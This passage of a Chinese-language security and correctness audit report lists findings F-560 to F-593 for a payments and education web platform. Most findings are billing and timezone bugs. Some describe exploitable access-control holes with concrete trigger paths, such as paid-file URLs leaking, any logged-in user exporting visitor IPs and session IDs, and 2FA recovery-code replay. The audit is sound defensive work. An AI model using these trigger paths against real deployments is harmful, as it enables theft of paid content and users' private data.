- 是否当场可修：是。

#### F-560 过期监听的 processed SET 只续期整键 TTL、成员永不过期
- 严重度：P3
- 文件与行号：`services/expiration-monitor-service.ts:47-48,196-201`
- 触发路径：每轮处理到新记录就 `SADD` 并 `EXPIRE key 25h`；25h 内只要发生一次处理，整键 TTL 被刷新，历史成员全部保留。
- 根因：SET 成员无独立 TTL，代码用整键 TTL 模拟窗口。
- 证据：`:199-200`；`:48` 的 TTL 常量。
- 影响面：Redis 内存随时间线性增长。
- 建议修法：改 ZSET（score=处理时间戳）+ `ZREMRANGEBYSCORE`，或按天分 key。
- 是否当场可修：是。

#### F-561 清理目录写死相对路径，与 `UPLOAD_DIR` 配置不一致时静默空转
- 严重度：P3
- 文件与行号：`services/cleanup-service.ts:32,61,126-128`；对照 `routes/files.ts:179`、`routes/workspace.ts:72`、`routes/chunked-upload.ts:72-76`
- 触发路径：部署设置 `UPLOAD_DIR=/data/uploads` → 上传写 `/data/uploads`，清理仍扫 `<cwd>/uploads` → `existsSync` 假 → `scanned=0` 且无错误。
- 根因：清理未读取 `UPLOAD_DIR`，目录不存在时静默视为无文件。
- 证据：`:32` 字面量；`:61` 的 existsSync 返回 []。
- 影响面：磁盘永不释放，监控显示「成功、0 个文件」。
- 建议修法：与上传模块共用路径配置；目录不存在时记 warning/error。
- 是否当场可修：是。

#### F-562 清理遍历使用同步 fs 且每轮扫描两遍
- 严重度：P3
- 文件与行号：`services/cleanup-service.ts:60-86,95-103,127,141`
- 触发路径：uploads 达数十万文件时全量递归两次。
- 根因：同步 API + 双次全扫 + 无 yield；`errors` 数组无上限。
- 证据：`:68,75` 同步调用；`:127` 与 `:141` 两次 `collectFiles`；`:100` 无上限 push。
- 影响面：worker 事件循环长时间被占用，其他定时任务延迟；权限异常时 errors 可撑爆内存。
- 建议修法：改 `fs/promises`、单次扫描、每 N 个 `await` 让出；errors 截断。
- 是否当场可修：是。

#### F-563 清理遍历跟随目录符号链接，可能删除 uploads 根目录之外的文件
- 严重度：P3（前提：uploads 下存在指向外部的目录符号链接）
- 文件与行号：`services/cleanup-service.ts:74-79,95-102`
- 触发路径：`statSync` 默认跟随符号链接，目录链接被 `isDirectory()` 判真并压栈，随后 `unlinkSync` 删除的是链接目标。
- 根因：用 `statSync` 而非 `lstatSync`，未做 realpath 边界校验。
- 证据：`:75` 的 statSync；`:76-77` 目录入栈；`:97` unlinkSync。
- 影响面：越过 uploads 边界删除其他数据。
- 建议修法：`lstatSync` + `isSymbolicLink()` 跳过；删除前 realpath 校验。
- 是否当场可修：是。

#### F-564 原子快照采集对 depth>10、readdir 失败、符号链接静默漏采，回滚仍返回 `ok:true`
- 严重度：P3
- 文件与行号：`services/atomic-rollback.ts:147-178,182-184,314,432-436,442`
- 触发路径：工作区存在 11 层以上目录 / 目录 EACCES / 符号链接文件。
- 根因：`if (depth>10) return`、`catch { return }`、`e.isFile()` 过滤均未记录 `skipped`；`uncovered` 只由 `meta.skipped + unread` 组成。
- 证据：`:148`、`:151-153`、`:161`；`:314` 只合并 `meta.skipped`；`:442` 的 `ok = failed===0`。
- 影响面：用户以为已完整回滚，实际深层/链接/不可读目录未恢复也未提示（假成功）。
- 建议修法：三处漏采写入 `skipped` 并标注目录级漏采；`uncovered>0` 时降低 `ok` 语义。
- 是否当场可修：是。

#### F-565 `planAtomicRollback` 对「stat 可读但 readFile 失败」的文件无捕获，整体 500
- 严重度：P3
- 文件与行号：`services/atomic-rollback.ts:287-303,307-312`
- 触发路径：文件权限 000/ACL 拒绝，或 stat 后被并发删除 → `readFile` 抛 EACCES/ENOENT 未捕获。
- 根因：可读性判断与读取动作分离，读取阶段无 try/catch。
- 证据：`:297`、`:311` 裸 `await readFile`；`:288-291` 只处理 stat 阶段的 unreadable。
- 影响面：单个异常文件导致用户无法预演/执行任何回滚。
- 建议修法：`readFile` 包 try/catch，读失败归入 `uncovered` 或按 absent 处理。
- 是否当场可修：是。

#### F-566 `autoCloseExpiredOrders` 无 LIMIT、串行调用渠道关单
- 严重度：P3（F-230 同文件但不同根因）
- 文件与行号：`services/reconciliation-service.ts:127-148`；`db/payment-queries.ts:152-158`
- 触发路径：每 10 分钟 `expired-order-cleanup` → 全量取超 30 分钟 pending 单 → 逐单 await 关单。
- 根因：查询无 LIMIT，循环串行无 deadline；`failed` 只返回不记指标。
- 证据：`payment-queries.ts:154-157` 无 limit；`reconciliation-service.ts:131-148` 的 for-await。
- 影响面：渠道慢/积压时单轮超 10 分钟，job 排队；内存随订单数增长。
- 建议修法：分批（200/批）+ 有界并发 + 整轮 deadline；失败记指标。
- 是否当场可修：是。

#### F-567 登录 2FA 恢复码「先校验后更新数组」非原子，同一恢复码并发可兑付两次
- 严重度：P3
- 文件与行号：`routes/auth-extended.ts:3853-3867`；同型 `routes/mfa.ts:248-258`；服务 `services/mfa-service.ts:98-108`
- 触发路径：同一 `backupCode` 两个并发请求同时读到相同 `twoFactorBackupCodes` → 两边校验都 true → 各自写回移除该 hash 的数组 → 两边都签发 token 对。
- 根因：校验与消费分离，UPDATE 无「该 hash 仍存在」条件，无事务/行锁/幂等键。
- 证据：`auth-extended.ts:3855-3866`；`mfa.ts:248-258`。
- 影响面：标称一次性的恢复码可被并发重放，单码换多会话。
- 建议修法：条件更新（`array_remove ... WHERE id=? AND ?=ANY(codes) RETURNING id`），仅 rowcount=1 才签发。
- 是否当场可修：是。

#### F-568 资源列表/详情/批量接口整行返回 `fileUrl`，付费资源下载权限被绕过
- 严重度：P1
- 文件与行号：`db/resource-queries.ts:127-134`（列表全列）、`:152-156`（详情全列）、`:171-173`（批量全列）；`routes/resource.ts:267-282,286-301,304-316`；对照 `routes/resource.ts:342-351`（下载前 `checkDownloadPermission`）
- 触发路径：任意登录用户 `GET /api/resources`、`GET /api/resources/by-ids`、`GET /api/resources/:id`。
- 根因：详情/批量/列表查询返回整行；只有 `/resources/:id/download` 对同一 `resources.fileUrl` 执行付费/VIP 校验；响应 schema 为 `data:{type:'object', additionalProperties:true}`，不做字段裁剪。
- 证据：主代理复核 `resource-queries.ts:127-134,152-161,171-174` 均无列投影；`resource.ts:47-55` 的 responseSchema 不裁剪；`:342-351` 下载链路才校验权限。
- 影响面：所有已发布付费资源的直链对任意登录用户可见，付费墙与 `/download` 校验形同虚设，可被批量抓取。
- 建议修法：列表/批量/详情显式列投影并剔除 `fileUrl`（付费资源仅在 `/download` 校验通过后返回/重定向）。
- 是否当场可修：是。

#### F-569 资源详情与批量接口未过滤 `isPublished/status`，草稿/下线资源可读且被计浏览
- 严重度：P2
- 文件与行号：`db/resource-queries.ts:144-162,170-174`；`routes/resource.ts:304-316,286-301`；对照 `:276-281`（列表强制过滤）、`resource-queries.ts:575-583`（下载用 `findPublishedResourceById`）
- 触发路径：`GET /api/resources/:id` 或 `/by-ids?ids=` 传入草稿/下线资源 ID。
- 根因：同一「资源详情」语义两套出口：列表/下载过滤发布态，详情/批量不过滤；详情还把 `viewCount+1` 放在存在性与发布态判断之前。
- 证据：`:148-151` 先自增；`:159` 的 where 只有 id；`:173` 只 `inArray(id)`。
- 影响面：管理员下架/未发布资源仍可读标题、简介、价格与直链；草稿浏览数被虚增，影响热度排序。
- 建议修法：详情/批量补 `isPublished=true AND status=1`（或区分 admin 查询），自增移到校验之后。
- 是否当场可修：是。

#### F-570 已撤销证书仍可由本人下载含官方信息的 PDF
- 严重度：P3
- 文件与行号：`routes/certificate.ts:163-173`；对照 `:121-123`（验证接口拒绝 `status!==1`）；`db/certificate-queries.ts:180-190`
- 触发路径：管理员撤销证书后，证书本人仍 `POST /api/certificates/:id/download`。
- 根因：下载只校验存在与 `userId`，未校验 `status`。
- 证据：`:169-173` 仅两条件；`:122` 验证出口明确拒绝；schema `certificate.ts:46` 注释 0=已撤销。
- 影响面：撤销后的证书仍可生成官方样式 PDF 并在站外使用，与验证页口径不一致。
- 建议修法：下载前判 `status===1`，否则 404/410。
- 是否当场可修：是。

#### F-571 `acceptAnswer` 未校验回答 `status`，已软删除回答可被采纳
- 严重度：P3
- 文件与行号：`db/community-queries.ts:424-427,452-478`；对照读路径 `:391-395`；软删 `routes/ask-extended.ts:76-78`
- 触发路径：提问者在回答被删（status=-1）后仍持 answerId，调用 `POST /api/asks/answers/:id/accept`。
- 根因：写路径复用无 status 条件的详情查询，更新 `isAccepted` 的 where 也只有 id。
- 证据：`:395` 读路径带 status=1；`:456-459` 只校验存在与 ask 归属；`:468-475` 无条件更新。
- 影响面：问题被标记已解决但采纳答案不可见，并清空其它正常回答的 `isAccepted`。
- 建议修法：`acceptAnswer` 校验 `answer.status===1`，更新条件加 status。
- 是否当场可修：是。

#### F-572 分页排序缺少唯一键兜底（F-356 同根因的新出口）
- 严重度：P3
- 文件与行号：`db/community-queries.ts:142-144,283-285,413-415`；`db/certificate-queries.ts:37-38,164-165`；`db/live-calendar-queries.ts:31-34`；`db/social-queries.ts:337-340`；`db/notification-queries.ts` 通知列表
- 触发路径：问答回答列表、圈子帖/问题列表、证书列表、直播日历、收藏、通知翻页。
- 根因：`ORDER BY` 均为非唯一列（或全 0 的布尔/计数），无 `id` 兜底。
- 证据：上述 `.orderBy(...).limit().offset()` 均无 `id` 末键；同仓 `billing-queries.ts` 已用唯一键兜底。
- 影响面：翻页重复/漏行；按 `likeCount` 排序时 0 赞并列最明显。
- 建议修法：各 `orderBy` 末尾追加主键。
- 是否当场可修：是。

#### F-573 逐行 `::int` 再 `sum`：中转成本/平台费报表被系统性放大或归零
- 严重度：P2
- 文件与行号：`routes/developer-relay.ts:372,378,380,393,396,397`；`routes/admin/relay-logs.ts:464`
- 触发路径：`GET /developer/relay/usage-analysis`、`GET /admin/relay/logs`。
- 根因：成本列是 6 位小数 `numeric`（`schema/llm-call-logs.ts:83`），但 SQL 在 `sum` 之前把每行 cast 成整数，等于逐笔按整分四舍五入后再求和。
- 证据：主代理复核 `developer-relay.ts:372,393` 的 `sum(((metadata->>'costCents')::numeric)::int)`；`relay-logs.ts:464` 同型；对照 `routes/admin/relay-stats.ts:55/79/156/208/264` 是 `sum(numeric)::int`（末尾取整一次）。
- 影响面：1000 次 × 0.4 分 → 合计 0（真实 400 分）；1000 次 × 0.6 分 → 1000（真实 600，+66.7%）；同一时段 `/admin/relay/logs` 与 `/admin/relay/stats` 对不上。
- 建议修法：去掉行级 cast，`sum(...)` 后只在最外层取整一次。
- 是否当场可修：是。

#### F-574 `sum(金额)::int` 溢出的 11 处新实例（F-22/F-458 未列）
- 严重度：P2
- 文件与行号：`routes/admin.ts:257,280`；`services/redemption-code-service.ts:394`；`services/relay-commission-service.ts:466,491-493`；`services/api-key-group-service.ts:143`；`routes/admin/relay-api-keys.ts:189`；`routes/admin/relay-stats.ts:55,79,156,208,264`；`services/relay-ops-snapshot.ts:134,158`；`routes/admin-ops-wallboard.ts:835`；`db/commission-queries.ts:752,756`
- 触发路径：累计金额超过 `2,147,483,647` 分（¥21,474,836.47）时 `numeric→int` 抛 `22003 integer out of range`，整个接口 500。
- 根因：全部为 `coalesce(sum(<金额列>),0)::int`；其中 `redemption-code-service.ts:394`、`relay-commission-service.ts:466`、`relay-api-keys.ts:189` 为**全量/全时段**口径，最易触发。
- 证据：各处 SQL 文本；主代理复核 `relay-stats.ts` 也是 `::bigint::int` 末端截断。
- 影响面：累计面值/返佣/租户成本一旦过阈值，对应报表与列表直接 500（非静默负数）。
- 建议修法：金额一律 `::bigint` 或直接返回 `numeric`，JS 侧判 `Number.MAX_SAFE_INTEGER`。
- 是否当场可修：是。

#### F-575 计费倍率 `toFixed(2)` 与 `numeric(5,2)` 舍入方向不一致
- 严重度：P3
- 文件与行号：`routes/admin/user-billing-groups.ts:116,149,284,292`；列定义 `schema/user-billing-groups.ts:34,88`；入参 `:66-69`
- 触发路径：管理员配置倍率 1.005 / 1.015 / 0.805。
- 根因：`toFixed(2)` 基于二进制值舍入，`(1.005).toFixed(2)==="1.00"` 而 PG `numeric(5,2)` 存 `1.01`；入参 schema 不限小数位。
- 证据：主代理复核四处 `toFixed(2)`；schema 列为 `numeric(5,2)`。
- 影响面：该组全部调用少收/多收 0.5% 级别，影响所有走组倍率的中转计费。
- 建议修法：不 `toFixed`，直接传数字让 PG 按列精度舍入。
- 是否当场可修：是。

#### F-576 充值成功邮件把「token 数」和「分」相加当金额
- 严重度：P3
- 文件与行号：`routes/developer-relay.ts:541`；请求 schema `:91-93`
- 触发路径：`tokenDelta=1_000_000, costDeltaCents=0` 的充值。
- 根因：`costYuan = ((tokenDelta + costDeltaCents)/100).toFixed(2)`，两者量纲不同。
- 证据：主代理复核 `:541` 的加法；`:91-93` 的字段说明。
- 影响面：邮件写 ¥10000.00（真实 ¥0.00），误导用户与客服对账。
- 建议修法：只用 `costDeltaCents/100`；token 另列。
- 是否当场可修：是。

#### F-577 月付签约 `setMonth(+1)` 月末溢出：1/31 签约 → 下次扣款 3/3，2 月整月不扣
- 严重度：P2
- 文件与行号：`routes/payment-recurring.ts:87-92`（首次调用 `:575`）；`:700`（每次扣款后重算）；`services/subscription-service.ts:337`（试用顺延，调用点 `:137`）
- 触发路径：2026-01-31 签约月付 → `nextChargeTime=2026-03-03` → 扣款扫描 `lte(nextChargeTime, now)` 在 2 月整月不命中 → 少扣一期；此后日期永久落在 3 号。
- 根因：`setMonth` 对月末不做夹取，`2026-02-31` 归一为 `2026-03-03`。
- 证据：主代理复核 `:87-92` 的 `next.setMonth(next.getMonth()+1)`。
- 影响面：每年 1/29–1/31、3/31、5/31、8/31、10/31 签约用户各少扣一期；试用期凭空多出整月；年付闰日多算一天。
- 建议修法：先 `setDate(1)` 再加月，最后夹到目标月最后一天；或直接用 SQL `+ interval '1 month'`。
- 是否当场可修：是。

#### F-578 `/admin/stats/visit-trend` 用 UTC 日串切窗口，而 `visit_date` 存的是上海日
- 严重度：P3
- 文件与行号：`routes/admin/stats.ts:1022-1023,1031,1038,1073`；写入端 `db/visit-tracking-queries.ts:92-93`（`bizDayKey()`）
- 触发路径：上海 00:00–07:59 访问该接口。
- 根因：窗口端点用 `toISOString().slice(0,10)`；`visit_date` 按 +08 写入；回退列 `to_char(created_at,'YYYY-MM-DD')` 又走 DB 会话时区。
- 证据：`:1022-1023` 的 start/end；`:1031` 的 coalesce；`visit-tracking-queries.ts:93`。
- 影响面：`range.end` 比数据最新桶早一天，30 天窗口实际带 31 天；每天 0–8 点自动偏移。
- 建议修法：改用 `bizDayKey()`/`shiftBizDayKey()`；回退列加 `AT TIME ZONE 'Asia/Shanghai'`。
- 是否当场可修：是。

#### F-579 食堂验收入库单 `procurementDate` 用 UTC 日
- 严重度：P3
- 文件与行号：`routes/edu-canteen.ts:72-73,326,720`
- 触发路径：上海 02:00 上传验收单且 AI 未返回 `receiptDate`。
- 根因：`todayStr()` 用 `toISOString().slice(0,10)`，落库日比上海日早一天。
- 证据：`:72-73` 的函数；`:326` 的 `final.receiptDate || todayStr()`。
- 影响面：采购台账日/月汇总与供应商对账整体前移一天。
- 建议修法：改用 `bizDayKey()`。
- 是否当场可修：是。

### 第十九轮未判定（证据不足，不计入结论）
1. **`relay-conversation-service` 的读从库后插主库 + 无幂等键**（`:90-101,108-117,168-178`）：`conversationId` 唯一冲突会 500、`logId` 重试会重复累加；但两个写函数当前**全仓无调用点**（见 F-538），无可达路径，故不计缺陷。
2. **生产是否设置 `UPLOAD_DIR`、scheduler 与 API 的 cwd 是否一致**：仓库内无 Dockerfile/compose/pm2 配置；这决定 F-549 是「删持久文件」还是 F-561 的「静默空转」，两种都成立。
3. **`canary_configs` 是否存在 `name='expiration-monitor'` 且 `is_active=true`**：无种子数据，若不存在则 F-552 的回滚风险降级。
4. **`admin/stats.ts:499/505/509/513/548/553` 的日界双来源**：`todayStart` 用 Node 主机本地午夜，趋势桶用 PG 会话时区，两者仅在双 TZ 一致时相同；F-263/F-151 已记同一前提冲突，需实测 `SHOW timezone`。
5. **`services/order-service.ts:220` `Math.round(amount/100)`**：当前入口 `amount` 恒为 100 的倍数，判定为潜伏，不列缺陷。
6. **`routes/edu-canteen.ts:148-149` float 逐项累加 + `toFixed(2)`**：仅在 AI 明细出现 3 位小数时才有偏差，未构造出可复现错值。
7. **`relay_conversations`/`relay_messages` 是否存在仓外写入方**：本仓无 insert；若有仓外中转服务直连同库，F-538 应降级为文档问题。
8. **pdfkit 在真实字体/流错误下是否 emit `error`**：代码未注册 `doc.on('error')`，存在请求悬挂风险，未构造复现。
9. **腾讯云 STS `DurationSeconds` 下限**：若路由允许 900s 而 CAM 要求 ≥7200s，腾讯分支恒失败；需厂商文档或实测。
10. **`cache-warmup-service.ts`**：`runWarmup`/`startScheduledWarmup` 全仓无调用方，当前零运行时影响。

---

## 二十四、第二十轮（五路并行）

> 基线复核：`HEAD == origin/main == 89a5938f0c`；apps/api 工作树另有 5 个文件差异，涉及文件均按 `git show HEAD:<path>` 读基线。本轮先 Grep 既有 579 条去重，再逐条复核 P1。

### 第二十轮 A 路：业务核心服务

#### F-580 退款 VIP/套餐订单时错误扣回 token 余额（与充值侧判据不对称）
- 严重度：P1
- 文件与行号：`services/order-service.ts:660-667`；对照 `:164`
- 触发路径：`POST /vip/order` 下单（`routes/vip.ts:276-280`，`orderType:2, productId: vipLevelId`）→ 支付成功（`:164` 因 `!productId` 为假、不充值）→ 运营在支付网关退款 → `refundOrder`。
- 根因：充值侧已补 `!order.productId` 判据，退款侧仍只看 `orderType`；VIP 订单从未入账 token，退款却按订单金额从余额扣回。
- 证据：`:164` `if ((orderType===2||orderType===3) && userId && !order.productId)`；`:660-662` `if ((orderType===2||orderType===3) && userId) { await refundTokenDeduct(userId, order.amount, orderNo, '退款') }`；`db/commission-queries.ts:185` 为 `Math.min(balance, quantity)` 尽力扣回。
- 影响面：退款 ¥99 VIP 订单会把用户已有余额扣 9900（或清零），并写一条假退款流水污染对账。
- 建议修法：退款判据补 `&& !order.productId`；或按 `token_flows` 中该 orderNo 实际入账额反查扣回。
- 是否当场可修：是。

#### F-581 连续包月代扣成功但不发放任何会员权益
- 严重度：P1
- 文件与行号：`routes/payment-recurring.ts:680-691`；`services/order-service.ts:567-569`、`:111-151`
- 触发路径：微信 `recurring.charge.success` → 事务内 `placeOrder({orderType:1, ...})` → `UPDATE orders SET planId` → `completeOrder`，全链不调 `activateOrderSubscription`。
- 根因：代扣订单只有 `planId`、`productId` 为空；且 `activateOrderSubscription` 只处理 `orderType 2/5/6`，`orderType=1` 无分支。即使补调用也会在 `:568` 直接 return。
- 证据：`:683` `orderType: 1`；`:687-690` 仅写 `planId`；`:691` `await completeOrder(...)`；`order-service.ts:568` `if (!order.productId) return`。对照 `payment-gateway.ts:615` 的同一 `orderType:1` 分支在 `completeOrder` 后显式调用 `activateOrderSubscription`（`:737`）。
- 影响面：用户每月被真实扣款、订单显示 paid，但 VIP 到期时间不延长、配额不发放。F-450 影响面“VIP/积分/充值已发放”对代扣链路不成立，本条为修正。
- 建议修法：代扣订单按套餐写正确 `orderType/productId`，并在 `completeOrder` 后调用 `activateOrderSubscription`；或给 `orderType=1` 增加显式激活分支。
- 是否当场可修：是。

#### F-582 教育账本“事务外读快照 + 绝对值写回”导致已收金额回退
- 严重度：P2
- 文件与行号：`services/edu-ledger.ts:457-484`
- 触发路径：同一报名两条并发入账（两期学费同时支付 / 家长代付 + 后台补录 / 回调重试）→ 两请求各自 `recordPayment` 后调 `recomputeEnrollment`。
- 根因：`loadEnrollmentLedger` 在事务外读全量流水；事务内写的是绝对值 `paidAmount/nextDueDate/各期 paidAmount/status`，无行锁、无版本条件。
- 证据：`:458` 事务外 `const ledger = await loadEnrollmentLedger(enrollmentId)`；`:459-484` `db.transaction` 内 `set({ paidAmount: ledger.paidAmount, ... })` 循环覆盖各期。
- 影响面：后落库的旧快照覆盖新快照 → 已缴金额少计、账期状态回退，学员被重复催缴；页面/逾期统计偏移直至下一次重算。
- 建议修法：快照读入同一事务并对 `edu_enrollment` 行 `SELECT ... FOR UPDATE`；或改增量 `paidAmount = paidAmount + delta`。
- 是否当场可修：是。

#### F-583 催费任务无视渠道配置，始终外发微信模板消息
- 严重度：P2
- 文件与行号：`services/edu-arrear-remind-service.ts:421`；对照 `:436`；调用 `workers/scheduler-worker.ts:824-825`
- 触发路径：配置 `EDU_ARREAR_REMIND_CHANNELS=sms`（或 `in_app`）→ 每日 `edu-arrear-remind-daily` 跑批。
- 根因：短信分支有 `channels.includes('sms')` 守卫，微信分支无条件执行。
- 证据：`:421` `const wx = await sendWxToRecipient(...)`（无 channels 判断）；`:436` `if (channels.includes('sms')) { ... }`。
- 影响面：运维关微信后仍对全体家长发送模板消息，触碰计费/频率/授权合规；渠道统计与配置不符。
- 建议修法：微信分支加 `if (channels.includes('wechat'))`，投递留痕仅在真发时记录。
- 复核结论：坐实（P2）。已修 2026-11-08（commit 0bcf77a3a7）：`:421` 微信分支加 `channels.includes('wechat')` 守卫；夹具 `tests/edu-arrear-remind-583-584.test.ts` 改前 6 红→改后 7 绿。数字对照：sms-only、2 报名×2 收件人，改前外发 4 条微信+4 条短信=8 条，改后仅 4 条短信、微信 0 条。
- 是否当场可修：是（2026-11-08 已修）。

#### F-584 催费留痕“先记成功再投递”，失败当天也被去重永久跳过
- 严重度：P2
- 文件与行号：`services/edu-arrear-remind-service.ts:401-412`；去重 `:366-372`；渠道写死 `:407`
- 触发路径：跑批 → 先 `INSERT edu_fee_reminder(status='sent', channel='in_app')` → 再逐收件人发送；微信未配置/站内信失败/无收件人时行仍为 `sent`，同日补跑被 `sentToday` 拦下。
- 根因：去重键是“当天存在任意留痕行”，不区分投递结果；`channel` 恒 `in_app` 与真实渠道不符。
- 证据：`:401-407` 先 insert 后发送、`channel:'in_app', status:'sent'`；`:412` 发送前 `result.reminded += 1`；`:369` `.where(gte(eduFeeReminder.createdAt, beijingMidnightUtc()))` 不筛 status。
- 影响面：瞬时故障使该报名整天不再提醒，面板却显示已提醒；按渠道统计全部失真。
- 建议修法：先 `pending` 后投递置 `sent/failed`；去重加 `status IN ('sent','partial')`；`channel` 写实际渠道。
- 复核结论：坐实（P2）。已修 2026-11-08（commit 0bcf77a3a7）：留痕先 `pending`，投递后按实际送达落 `sent/failed`；去重只认 `status='sent'`（本批不产生 `partial`）；`channel` 写实际送达通道（wechat→sms→in_app）。数字对照：3 条欠费 100+200+300 全通道失败，改前仍占当日去重（skippedToday=3、补跑覆盖 0 元），改后补跑 3 条、覆盖 600 元。
- 是否当场可修：是（2026-11-08 已修）。

#### F-585 `completeOrder` 路径不发积分、不写 order.paid outbox
- 严重度：P2
- 文件与行号：`services/order-service.ts:111-151`；对照 `:264-293`
- 触发路径：USDT（`payment-gateway.ts:1214`）、PayPal（`:1496,:1645`）、代扣（`payment-recurring.ts:691`）、企业兑换（`relay-enterprise-service.ts:539`）→ `completeOrder`。
- 根因：积分发放与 outbox 只存在于 `completeOrderWithSaga → replayPaidSideEffects`；`completeOrder` 仅 `rechargeIfTokenOrder` + `applyEduTuitionOrder`。
- 证据：`:130-132` 只有两次调用；`:275-293` 的 `earnPoints` + outbox 仅在 saga 侧。
- 影响面：同一“消费 1 元=1 积分”规则按支付渠道分裂；下游事件消费看不到这批已支付订单。
- 建议修法：把积分 + outbox 收敛进共享函数，两条路径统一调用（幂等键 `orderNo` 已有）。
- 是否当场可修：是。

#### F-586 智能体购买判定忽略 status/expiresAt，未支付也显示“已购买”
- 严重度：P2
- 文件与行号：`services/agent-service.ts:193-212`；路由 `routes/agent-extended.ts:591-596,633`
- 触发路径：`POST /agent/buy/create` 插入 `status='pending'`（`:598-606`，未支付）→ `GET /agent/permission` 返回 `type:'purchased', accountType:'已购买'`；过期/取消/退款同理。
- 根因：只按 `(userId, agentId)` 查一行，无 `status='active'`、无 `expiresAt > now()`；付费分支只改 `accountType`，`hasPermission` 恒初始 true。
- 证据：`:196-205` `.where(and(eq(userId), eq(agentId))).limit(1)`；`:207-210` 命中即置 `purchased`。
- 影响面：状态即权限 API，前端据此隐藏购买入口；当前服务端执行入口尚未按此放行，故非直接越权，但任何新调用方按 `type/hasPermission` 放行即白嫖。
- 建议修法：查询加 `status='active'` 与未过期条件；付费 agent 未购买时 `hasPermission=false`。
- 是否当场可修：是。

#### F-587 订阅实例的 orderNo 幂等靠副本读 + 非唯一索引，异常吞成 null
- 严重度：P2
- 文件与行号：`services/subscription-window-service.ts:361-417`；schema `packages/database/src/schema/billing.ts:255`；消费 `api-subscription-service.ts:487-509`
- 触发路径：同一支付回调并发/重复投递（`tokenQuota=-1/0` 时无 `token_flows` 幂等行）→ 两次都进入 `createSubscriptionForOrder`。
- 根因：① `order_no` 只有普通索引（注释自称幂等键），DB 无唯一兜底；② 幂等预查与取旧 `endAt` 都走 `dbRead` 副本；③ 整函数 `catch { return null }`。
- 证据：`:361-366` 副本查重；`:380` 副本取 `endAt`；`:414` `catch { return null }`。
- 影响面：重复回调插入两条重叠订阅，窗口额度分裂；`return null` 时调用方已发 token 配额，且无日志，属静默 fail-open。
- 建议修法：`order_no` 建部分唯一索引 + `ON CONFLICT DO NOTHING`；读主库；catch 记录并向上抛。
- 是否当场可修：是（含一次 DDL）。

#### F-588 AI 预算 upsert 无唯一约束，并发激活产生重复预算行
- 严重度：P3
- 文件与行号：`services/plan-entitlement-service.ts:89-118`；schema `packages/database/src/schema/ai-cost.ts:83`
- 触发路径：同一用户两笔套餐订单并发回调（或续费 + 人工补发）→ `upsertUserAiBudget` 两次。
- 根因：`select ... limit(1)` 后 `insert`，无事务/无 `ON CONFLICT`；`ai_budget_scope_idx` 是普通 index。
- 证据：`:89-101` 先查后插；读取方 `plugins/ai-cost.ts:246-255` 用 `.limit(1)` 且无 `ORDER BY`。
- 影响面：同用户多预算行，限额随机取一条（可能放宽或收紧），告警重复。
- 建议修法：`(scope, scope_key, model)` 唯一索引 + `onConflictDoUpdate`。
- 是否当场可修：是（需迁移）。

#### F-589 缺勤补判单条 INSERT 无分批，超大班/回溯会超参数上限并中断整轮
- 严重度：P3
- 文件与行号：`services/edu-attendance-absent-job.ts:637-654`；循环 `:547`；常量 `:126-132`
- 触发路径：每日 18:30 跑批或 `backfillDays=30` → 逐规则一次性 `insert(...).values(candidates)`。
- 根因：`candidates` 无上限、无分片；行数 = 学生数 × (backfillDays+1)，每条 6 个绑定参数，超过 PG 65,535 参数上限即抛错；循环内无 try/catch，一条规则失败终止整轮。
- 证据：`:637-643` 单条大 `insert().values(candidates.map(...))`；`:547` for 循环体无异常隔离。
- 影响面：超大班/回溯时该轮后续班级全部漏判，且每天在同一处中断。
- 建议修法：按 500 行分片 insert；循环体 try/catch 计数并继续。
- 是否当场可修：是。

#### F-590 计费组回退默认组时不校验 enabled
- 严重度：P3
- 文件与行号：`services/user-billing-group-service.ts:45-60`
- 触发路径：用户无未过期关联（新用户/订阅到期/组被停用）→ 回退默认组；运营已把默认组 `enabled=false`。
- 根因：成员组分支有 `if (group && group.enabled)`，默认组分支只按 `isDefault=true` 取。
- 证据：`:51` `if (group && group.enabled) return group`；`:55-59` `.where(eq(userBillingGroups.isDefault, true)).limit(1)` 无 enabled。
- 影响面：被停用的默认组仍对全部无关联用户生效（倍率/QPM）。
- 建议修法：默认组查询加 `eq(enabled, true)`。
- 是否当场可修：是。

#### F-591 团队成员可把他人收件箱条目标记为已读（无归属校验）
- 严重度：P3
- 文件与行号：`services/agent-team-service.ts:278-287`
- 触发路径：普通成员调用 `POST .../inbox/:entryId/read`，传队友的 `entryId`。
- 根因：只校验调用者是本队 active human，未校验条目的 `toMember` 是否等于调用者。
- 证据：`:280-284` `await loadActiveTeam(...)` 后直接 `repo.markInboxRead(teamId, entryId, new Date())`，更新条件无 `toMember`。
- 影响面：可批量隐藏队友未读（尤其 handoff 交接消息），交接链断裂且留痕显示已读。
- 建议修法：更新条件加接收人归属，或服务层先校验归属。
- 是否当场可修：是。

### 第二十轮 B 路：db 查询层

#### F-592 任意登录用户可导出全站访问明细（IP/UA/URL/sessionId）
- 严重度：P1
- 文件与行号：`routes/statistics.ts:659-666`；`db/statistics-queries.ts:432-452`；`routes/index.ts`(HEAD):686-687；`packages/database/src/schema/visit-tracking.ts:16-24`
- 触发路径：任意登录用户 `GET /api/visit-tracking/visits?page=1&pageSize=100`，可翻页遍历全表。
- 根因：PII 列表挂在只做 `checkAuth` 的插件；同类管理端点都在 `adminStatisticsRoutes`（`preHandler: requireAdmin`，`statistics.ts:488-489`）。
- 证据：`statistics.ts:84-87` 仅 `checkAuth` preHandler；`:659-665` 无 `requireAdmin`、无 response schema；`statistics-queries.ts:441-442` `.select().from(visitLogs)` 全列；表含 `userId/ip/city/url/referer/userAgent/sessionId`。
- 影响面：跨用户隐私泄露，可关联 userId 与真实 IP、浏览路径、会话 ID；`pageSize` 上限 100 且无频控，可全量爬取。
- 建议修法：移到 `adminStatisticsRoutes` 或加 `requireAdmin`；改为显式列并隐藏 `sessionId/userAgent`。
- 是否当场可修：是。

#### F-593 `GET /api/agent/zhsAgent/:id` 直出 agents 整行（含系统提示词/变量/Coze 账号）
- 严重度：P2
- 文件与行号：`db/agents-queries.ts:66-69`；`routes/agentic-service.ts:39-44`；`packages/database/src/schema/agents-extended.ts:55,59,65,67`
- 触发路径：任意登录用户（`agentic-service.ts` 顶部为 `checkAuth` preHandler）`GET /api/agent/zhsAgent/<任意 agentId>`。
- 根因：查询 `select()` 全列，路由 `success(agent)` 原样返回；无字段白名单、无 `publishStatus/status` 过滤，绕过 `routes/agents.ts` 的公开字段白名单。
- 证据：`agents-queries.ts:66-69` 全列 + `limit(1)`；`agentic-service.ts:39-44` 查到即 `success(agent)`；schema 含 `agentPrompt/agentVariables/cozeAccountId/publishStatus`。
